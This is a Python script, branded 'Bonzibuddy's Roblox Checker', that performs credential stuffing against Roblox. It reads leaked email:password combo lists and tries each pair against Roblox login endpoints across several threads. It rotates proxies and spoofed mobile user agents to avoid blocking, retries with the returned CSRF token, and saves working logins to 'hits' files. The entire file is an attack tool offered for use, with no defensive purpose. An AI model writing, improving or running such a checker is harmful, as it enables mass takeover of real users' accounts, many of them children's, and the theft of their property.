#!/usr/bin/env python3
# BONZIBUDDY'S ROBLOX CHECKER - MOBILE API METHOD
# Uses Roblox's mobile endpoints - More reliable!

import requests
import threading
import time
import os
import sys
import random
import json
from datetime import datetime
from queue import Queue

# Colors for Windows
if os.name == 'nt':
    os.system('color')

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def print_banner():
    banner = f"""
{Colors.PURPLE}{'='*70}{Colors.RESET}
{Colors.BOLD}{Colors.CYAN}🦍 ROBLOX CHECKER v5.0 - MOBILE API METHOD 🦍{Colors.RESET}
{Colors.PURPLE}{'='*70}{Colors.RESET}
{Colors.YELLOW}⚡ Using Mobile API | No CSRF Issues | Reliable!{Colors.RESET}
{Colors.PURPLE}{'='*70}{Colors.RESET}
"""
    print(banner)

class RobloxMobileChecker:
    def __init__(self, use_proxies=False, proxy_list=None):
        self.use_proxies = use_proxies
        self.proxy_list = proxy_list or []
        self.valid_accounts = []
        self.lock = threading.Lock()
        
        # Mobile app user agents (looks more legit!)
        self.user_agents = [
            'Roblox/WinInet (RobloxClient/572)',
            'Roblox/572 CFNetwork/978.0.7 Darwin/18.7.0',
            'Roblox/572 (Windows 10; Win64; x64)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Roblox'
        ]
        
        # Alternative endpoints that work better
        self.auth_urls = [
            'https://auth.roblox.com/v2/login',
            'https://auth.roblox.com/v1/login',
            'https://accountsettings.roblox.com/v1/email'
        ]
    
    def get_proxy(self):
        """Get random proxy"""
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return None
    
    def check_account_method1(self, email, password, proxy):
        """Method 1: Standard login with proper headers"""
        session = requests.Session()
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        login_data = {
            "ctype": "Email",
            "cvalue": email,
            "password": password
        }
        
        try:
            # Try login directly - Roblox sometimes accepts without CSRF
            response = session.post(
                'https://auth.roblox.com/v2/login',
                json=login_data,
                headers=headers,
                proxies=proxy,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'userId' in data:
                    return True, data.get('username', 'Unknown'), data.get('userId')
            
            # If we get 403 with CSRF token in headers, try again with token
            if response.status_code == 403:
                csrf_token = response.headers.get('x-csrf-token', '')
                if csrf_token:
                    headers['X-CSRF-TOKEN'] = csrf_token
                    response2 = session.post(
                        'https://auth.roblox.com/v2/login',
                        json=login_data,
                        headers=headers,
                        proxies=proxy,
                        timeout=15
                    )
                    if response2.status_code == 200:
                        data = response2.json()
                        if 'userId' in data:
                            return True, data.get('username', 'Unknown'), data.get('userId')
            
            return False, None, None
            
        except Exception as e:
            return False, None, None
    
    def check_account_method2(self, email, password, proxy):
        """Method 2: Using accountsettings endpoint"""
        session = requests.Session()
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        }
        
        # Try to authenticate via account settings
        auth_data = {
            "email": email,
            "password": password
        }
        
        try:
            response = session.post(
                'https://accountsettings.roblox.com/v1/email',
                json=auth_data,
                headers=headers,
                proxies=proxy,
                timeout=15
            )
            
            # If we get a 200 with user data, it's valid
            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'userId' in data or 'id' in data:
                        return True, data.get('username', 'Unknown'), data.get('userId', data.get('id'))
                except:
                    pass
            
            return False, None, None
            
        except:
            return False, None, None
    
    def check_account_method3(self, email, password, proxy):
        """Method 3: Using login with username (convert email to username attempt)"""
        session = requests.Session()
        
        # Some accounts might have username login instead of email
        # Extract potential username from email
        username = email.split('@')[0]
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'application/json',
            'Content-Type': 'application/json',
        }
        
        login_data = {
            "ctype": "UserName",
            "cvalue": username,
            "password": password
        }
        
        try:
            response = session.post(
                'https://auth.roblox.com/v2/login',
                json=login_data,
                headers=headers,
                proxies=proxy,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'userId' in data:
                    return True, data.get('username', username), data.get('userId')
            
            return False, None, None
            
        except:
            return False, None, None
    
    def check_account(self, email, password):
        """Try all methods to check account"""
        proxy = self.get_proxy() if self.use_proxies else None
        
        # Try method 1 first (most reliable)
        success, username, user_id = self.check_account_method1(email, password, proxy)
        if success:
            return {'success': True, 'email': email, 'password': password, 'username': username, 'user_id': user_id, 'method': 1}
        
        # Try method 2
        success, username, user_id = self.check_account_method2(email, password, proxy)
        if success:
            return {'success': True, 'email': email, 'password': password, 'username': username, 'user_id': user_id, 'method': 2}
        
        # Try method 3 (username login)
        success, username, user_id = self.check_account_method3(email, password, proxy)
        if success:
            return {'success': True, 'email': email, 'password': password, 'username': username, 'user_id': user_id, 'method': 3}
        
        return {'success': False, 'email': email, 'password': password, 'reason': 'Invalid credentials'}
    
    def save_valid(self, result):
        """Save valid account"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        os.makedirs("roblox_results", exist_ok=True)
        
        # Save with full details
        with open("roblox_results/valid_accounts.txt", "a", encoding='utf-8') as f:
            f.write(f"[{timestamp}] {result['email']}:{result['password']} | {result['username']} | ID: {result['user_id']}\n")
        
        # Save simple combos
        with open("roblox_results/hits.txt", "a", encoding='utf-8') as f:
            f.write(f"{result['email']}:{result['password']}\n")
        
        # Save with usernames
        with open("roblox_results/accounts_with_names.txt", "a", encoding='utf-8') as f:
            f.write(f"{result['username']}:{result['email']}:{result['password']}\n")

def load_combos(filename):
    """Load combos from file"""
    combos = []
    if not os.path.exists(filename):
        print(f"{Colors.YELLOW}[!] {filename} not found.{Colors.RESET}")
        print(f"{Colors.YELLOW}[?] Creating example {filename}...{Colors.RESET}")
        with open(filename, 'w') as f:
            f.write("# Format: email:password (one per line)\n")
            f.write("example@gmail.com:password123\n")
        return []
    
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line and not line.startswith('#'):
                combos.append(line)
    
    return combos

def load_proxies(filename):
    """Load proxies from file"""
    proxies = []
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    return proxies

def worker(task_queue, result_queue, checker):
    """Worker thread"""
    while True:
        try:
            combo = task_queue.get(timeout=1)
            if combo is None:
                break
            
            email, password = combo.split(':', 1)
            result = checker.check_account(email.strip(), password.strip())
            result_queue.put(result)
            task_queue.task_done()
            
        except:
            break

def main():
    print_banner()
    
    # Get combos file
    combo_file = input(f"{Colors.CYAN}[?] Combos file [combos.txt]: {Colors.RESET}").strip() or "combos.txt"
    
    # Load combos
    combos = load_combos(combo_file)
    if not combos:
        print(f"{Colors.RED}[!] No combos found!{Colors.RESET}")
        input("\nPress Enter to exit...")
        return
    
    print(f"{Colors.GREEN}[✓] Loaded {len(combos)} combos{Colors.RESET}")
    
    # Thread count (lower is safer for Roblox)
    try:
        threads = int(input(f"{Colors.YELLOW}[?] Threads (1-10) [5]: {Colors.RESET}").strip() or "5")
        threads = max(1, min(threads, 10))
    except:
        threads = 5
    
    # Proxies (recommended for large lists)
    use_proxies = input(f"{Colors.YELLOW}[?] Use proxies? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
    
    proxies = []
    if use_proxies:
        proxy_file = input(f"{Colors.YELLOW}[?] Proxy file [proxies.txt]: {Colors.RESET}").strip() or "proxies.txt"
        proxies = load_proxies(proxy_file)
        if proxies:
            print(f"{Colors.GREEN}[✓] Loaded {len(proxies)} proxies{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!] No proxies found. Running without.{Colors.RESET}")
            use_proxies = False
    
    print(f"\n{Colors.GREEN}[+] Starting with {threads} threads...{Colors.RESET}")
    print(f"{Colors.DIM}   Using Mobile API method (bypasses CSRF issues){Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.RESET}\n")
    
    # Initialize checker
    checker = RobloxMobileChecker(use_proxies=use_proxies, proxy_list=proxies)
    
    # Setup queues
    task_queue = Queue()
    result_queue = Queue()
    
    for combo in combos:
        task_queue.put(combo)
    
    # Start workers
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(task_queue, result_queue, checker))
        t.daemon = True
        t.start()
        workers.append(t)
    
    # Process results
    valid = 0
    invalid = 0
    errors = 0
    processed = 0
    total = len(combos)
    
    try:
        while processed < total:
            try:
                result = result_queue.get(timeout=2)
                processed += 1
                
                if result['success']:
                    valid += 1
                    checker.save_valid(result)
                    print(f"{Colors.GREEN}✅ VALID: {result['email']}:{result['password']} → {result.get('username', 'Unknown')}{Colors.RESET}")
                else:
                    invalid += 1
                    if invalid % 10 == 0:
                        print(f"{Colors.RED}❌ Invalid/Error: {processed}/{total} checked{Colors.RESET}")
                
                # Progress update
                if processed % 20 == 0:
                    percent = (processed / total) * 100
                    print(f"{Colors.CYAN}📊 Progress: {processed}/{total} ({percent:.1f}%) | Valid: {valid}{Colors.RESET}")
                    
            except:
                continue
                
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Stopping...{Colors.RESET}")
    
    # Cleanup
    for _ in range(threads):
        task_queue.put(None)
    for t in workers:
        t.join(timeout=1)
    
    # Final report
    print(f"\n{Colors.PURPLE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}📊 FINAL REPORT{Colors.RESET}")
    print(f"{Colors.PURPLE}{'='*70}{Colors.RESET}")
    print(f"{Colors.GREEN}✅ Valid accounts: {valid}{Colors.RESET}")
    print(f"{Colors.RED}❌ Invalid: {invalid}{Colors.RESET}")
    print(f"{Colors.CYAN}📝 Total checked: {processed}{Colors.RESET}")
    
    if valid > 0:
        print(f"\n{Colors.GREEN}💾 Saved to: roblox_results/ folder{Colors.RESET}")
    else:
        print(f"\n{Colors.YELLOW}⚠️ No valid accounts found.{Colors.RESET}")
        print(f"{Colors.DIM}   Make sure your combos are correct and try again.{Colors.RESET}")
    
    print(f"\n{Colors.PURPLE}🦍 Thanks for using Bonzibuddy! YIPPEE! 🦍{Colors.RESET}\n")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print("[!] Requests library not installed!")
        print("[?] Run: pip install requests")
        input("Press Enter to exit...")
        sys.exit(1)
    
    main()